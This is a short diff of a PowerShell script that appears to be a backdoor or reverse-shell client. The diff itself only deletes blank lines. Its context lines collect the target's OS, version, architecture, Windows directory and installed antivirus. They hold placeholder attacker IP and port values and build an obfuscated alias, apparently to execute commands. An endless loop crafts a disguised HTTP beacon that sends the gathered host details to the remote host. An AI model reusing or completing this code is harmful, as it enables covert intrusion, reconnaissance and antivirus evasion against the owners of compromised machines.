@@ -4,7 +4,6 @@ $Architecture = (Get-WmiObject Win32_OperatingSystem).OSArchitecture;
 $WindowsDirectory = (Get-WmiObject Win32_OperatingSystem).WindowsDirectory;
 $av = (Get-WmiObject -Namespace 'root/SecurityCenter2' -Class 'AntiVirusProduct').displayname;
 
-
 $IP = "Insert IP"
 $PORT = "Insert Port"
 $source = "ABCERFSRGIAGSFGÑOTWEQDIAXRADI"
@@ -40,18 +39,8 @@ function Convert2(){
 }
 
 
-
-
-
-
-
-
 while($true){
-  
-
-
   $x2 = Convert
-  
   Set-Alias $source($source[$true-8] + ($source[[byte]$Item - $x2])+ ($source[$true+$true-7] ))
   $UserAG = Get-UserAgent
   $w = "System: $System`r`nVERSION: $Version`r`nARCH: $Architecture`r`nDIRECTORY: $WindowsDirectory`r`nAVS: $av`r`nGET /index.html HTTP/1.1`r`nHost: $IP`r`n$UserAG`r`nAccept: text/html`r`n`r`n"
